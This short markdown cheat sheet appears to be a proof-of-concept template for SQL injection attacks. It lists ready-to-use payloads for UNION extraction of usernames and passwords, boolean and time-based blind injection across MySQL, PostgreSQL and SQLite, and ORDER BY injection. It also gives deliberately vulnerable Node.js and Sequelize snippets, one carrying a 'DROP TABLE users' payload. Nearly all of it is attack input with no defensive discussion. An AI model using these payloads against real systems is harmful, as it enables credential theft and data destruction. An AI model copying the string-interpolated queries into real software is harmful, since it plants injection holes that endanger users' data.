# PoC Skeleton -- SQL Injection

## UNION-Based Extraction

```
# Determine column count
input: ' ORDER BY 1--
input: ' ORDER BY 2--
...until error

# UNION extraction
input: ' UNION SELECT 1,2,3--
input: ' UNION SELECT username,password,3 FROM users--
```

## Boolean Blind

```
# True condition
input: ' AND 1=1--
# False condition
input: ' AND 1=2--
# Compare responses to extract data bit by bit
```

## Time Blind

```
# MySQL
input: ' AND SLEEP(5)--
# PostgreSQL
input: '; SELECT pg_sleep(5)--
# SQLite
input: ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
```

## ORDER BY Injection

```js
// Even with parameterized queries, ORDER BY cannot be parameterized
const sort = req.query.sort; // User input
db.query(`SELECT * FROM users ORDER BY ${sort}`);
// Payload: sort = "(CASE WHEN (SELECT 1)=1 THEN id ELSE name END)"
```

## ORM Raw Query Injection

```js
const { Sequelize } = require('sequelize');
const seq = new Sequelize('sqlite::memory:');

// UNSAFE: user input in raw query
const userInput = "'; DROP TABLE users; --";
await seq.query(`SELECT * FROM users WHERE name = '${userInput}'`);
```
